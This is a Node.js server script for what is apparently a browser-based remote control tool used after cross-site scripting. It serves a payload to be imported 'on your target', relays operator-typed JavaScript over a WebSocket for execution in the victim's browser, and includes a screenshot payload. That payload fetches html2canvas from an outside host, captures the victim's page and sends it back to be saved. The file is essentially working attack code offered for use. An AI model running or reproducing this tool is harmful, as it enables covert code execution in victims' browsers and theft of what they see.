const express = require('express')
const cors = require('cors')
const ws = require('ws')
const prompts = require('prompts')
const fs = require('fs')

const app = express()
app.use(cors())
const server = app.listen(3000)
const wsServer = new ws.Server({ server })

app.get('/client.js', (req, res) => {
  const websocket = `ws${req.protocol == 'https' ? 's':''}://${req.get('host')}/`
  const payload = fs.readFileSync('./payloads/client.js', 'utf8').replace('%websocket%', websocket)
  res.type('application/javascript')
  res.send(payload)
})

let clientSocket = false
let prompt = false

console.log('Listening on port 3000.\nImport the script located at /client.js on your target')

wsServer.on('connection', socket => {
  console.log('client connected.')
  clientSocket = socket
  socket.on('message', handleMessage)
})

async function handleMessage(message) {
  message = message.toString()
  message = JSON.parse(message)
  switch (message.type) {
    case 'output':
      console.log(`> ${message.data}`)
      break

    case 'info':
      console.log(`UA: ${message.data.browser}\nURL: ${message.data.url}`)
      break
    
    case 'ss':
      const filename = `screenshot_${Date.now()}.png`
      const data = Buffer.from(message.data.replace('data:image/png;base64,', ''), 'base64')
      console.log(`Received screenshot! Saved to ${filename}`)
      fs.writeFileSync(filename, data)
      break
  
    default:
      console.log(`Received unknown payload type: ${JSON.stringify(message)}`)
      break
  }
  if (!prompt) commandPrompt()
}

async function commandPrompt() {
  prompt = true
  const { cmd } = await prompts({
    type: 'text',
    name: 'cmd',
    message: 'js'
  })
  prompt = false

  switch (cmd) {
    case '.exit':
      process.exit()
    
    case '.ss':
      takeSS()
  
    default:
      clientSocket.send(JSON.stringify({ type: 'run', data: cmd }))
  }

  setTimeout(() => {
    if (!prompt) {
      console.log('Output timed out.')
      commandPrompt()
    }
  }, 2000)
}

function takeSS() {
  console.log('Sending screenshot payload...')
  const payload = `import('https://html2canvas.hertzen.com/dist/html2canvas.min.js').then(() => html2canvas(document.body).then(canvas => socket.send(JSON.stringify({type:'ss',data:canvas.toDataURL('image/png')}))))`
  clientSocket.send(JSON.stringify({ type: 'run', data: payload, noout: true }))
  console.log('Payload sent.')
  setTimeout(() => {
    if (!prompt) {
      console.log('Output timed out.')
      commandPrompt()
    }
  }, 2000)
}